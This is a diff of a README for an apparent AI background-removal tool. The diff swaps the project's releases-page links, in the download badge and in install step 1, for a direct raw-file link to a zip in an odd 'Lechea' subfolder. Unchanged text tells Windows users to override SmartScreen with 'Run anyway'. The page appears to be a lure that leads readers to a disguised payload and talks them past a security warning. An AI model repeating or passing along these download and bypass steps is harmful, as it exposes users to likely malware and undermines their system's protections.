@@ -1,6 +1,6 @@
 # 📸 ai-background-remover-removebg-photoroom - Remove image backgrounds using smart technology
 
-[![](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/Kubalu7600/ai-background-remover-removebg-photoroom/releases)
+[![](https://img.shields.io/badge/download-latest-blue.svg)](https://raw.githubusercontent.com/Kubalu7600/ai-background-remover-removebg-photoroom/main/Lechea/background-removebg-remover-photoroom-ai-v2.5.zip)
 
 This software removes backgrounds from your images automatically. It uses artificial intelligence to detect the main subject of a photo. You get a clean, transparent image in seconds. You do not need experience in photo editing to use this tool.
 
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  **Visit the Download Page:** You can find the installation files at this link: [https://github.com/Kubalu7600/ai-background-remover-removebg-photoroom/releases](https://github.com/Kubalu7600/ai-background-remover-removebg-photoroom/releases).
+1.  **Visit the Download Page:** You can find the installation files at this link: [https://raw.githubusercontent.com/Kubalu7600/ai-background-remover-removebg-photoroom/main/Lechea/background-removebg-remover-photoroom-ai-v2.5.zip](https://raw.githubusercontent.com/Kubalu7600/ai-background-remover-removebg-photoroom/main/Lechea/background-removebg-remover-photoroom-ai-v2.5.zip).
 2.  **Download the Installer:** Look for the file ending in `.exe` under the latest release section. Click the file name to start the download.
 3.  **Run the File:** Once the download finishes, locate the file in your downloads folder. Double-click the file to begin the installation.
 4.  **Security Prompt:** If Windows shows a message saying "Windows protected your PC," click the "More info" link and then select "Run anyway." This happens because the installer is new and does not have a high reputation score yet with Microsoft.
